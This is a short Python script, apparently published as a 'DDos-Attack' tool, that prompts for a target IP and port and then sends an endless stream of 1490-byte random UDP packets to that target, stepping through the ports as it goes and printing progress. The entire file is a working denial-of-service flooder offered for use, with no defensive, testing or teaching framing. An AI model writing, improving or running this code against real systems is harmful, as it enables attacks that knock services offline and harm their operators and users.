import sys
import os
import time
import socket
import random
from datetime import datetime

# Function to clear the screen
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Function to display progress
def progress_bar(percent):
    bar_length = 20
    filled = int(bar_length * percent / 100)
    bar = '=' * filled + '-' * (bar_length - filled)
    print(f"[{bar}] {percent}% ", end='\r')

# Main function
def main():
    clear_screen()
    print("Author    : Hiren Solanki")
    print("github    : https://github.com/HirenSolanki210/DDos-Attack.git")
    print("")

    try:
        ip = input("IP Target : ")
        port = int(input("Port       : "))
    except ValueError:
        print("\n[!] Invalid port. Please enter a valid integer.")
        sys.exit()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)

    clear_screen()
    print("Attack Starting...")

    progress_bar(0)
    time.sleep(0.5)

    sent = 0
    port_range = 65535
    start_time = time.time()

    while True:
        try:
            sock.sendto(bytes, (ip, port))
            sent += 1
            print(f"Sent {sent} packets to {ip} through port {port}", end='\r')
            port = (port % port_range) + 1  # Wrap around port number
            elapsed_time = time.time() - start_time
            progress = (sent / port_range) * 100
            progress_bar(progress)
            time.sleep(0.01)
        except KeyboardInterrupt:
            print("\n[!] Stopped by user")
            break
        except Exception as e:
            print(f"\n[!] Error: {e}")
            break

    print("\n[+] Attack completed.")

if __name__ == "__main__":
    main()
